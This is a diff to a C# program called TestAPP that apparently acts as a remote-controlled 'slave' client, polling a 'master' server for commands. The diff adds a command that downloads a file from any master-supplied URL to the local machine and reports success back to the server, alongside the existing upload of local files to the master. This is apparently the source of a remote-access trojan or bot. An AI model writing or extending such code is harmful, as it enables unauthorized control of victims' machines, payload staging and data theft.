@@ -2,6 +2,8 @@
 using System.Collections;
 using System.Collections.Generic;
 using System.Linq;
+using System.Net;
+using System.Security.Policy;
 using System.Text;
 using TestAPP.lib;
 
@@ -95,9 +97,33 @@ namespace TestAPP
                 case Constants.SLAVE_COMMAND_KEY_VALUE_FILEDOWNLOAD:
                     uploadFileToMaster(sysInfo, HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_COMMAND));
                     break;
+                case Constants.SLAVE_COMMAND_KEY_VALUE_GETFILEURL:
+                    downloadFileToLocalFromInternet(sysInfo, HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_COMMAND));
+                    break;
             }
 
             System.Threading.Thread.Sleep(Constants.TIME_TO_WAIT_BETWEEN_COMMANDS_MILLISECONDS);
+        }
+
+        static void downloadFileToLocalFromInternet(SystemInfo sysInfo, string command)
+        {
+            string[] separators = { Constants.FILE_DOWNLOAD_SPLIT_DELIMETER };
+            string[] contents = command.Split(separators, StringSplitOptions.None);
+            string url = contents[0];
+            string fileName = contents[1];
+
+            bool fileDownloadSuccess = FileDownloadUtil.downloadFileFromURL(url, fileName);
+            string responseText = "";
+
+            if (fileDownloadSuccess)
+            {
+                responseText = "File Download Success";
+            }
+            else
+            {
+                responseText = "Error downloading file";
+            }
+            FileDownloadUtil.sendResponseToServer(sysInfo.macAddress, responseText);
         }
         static void obeyMaster(SystemInfo sysInfo)
         {
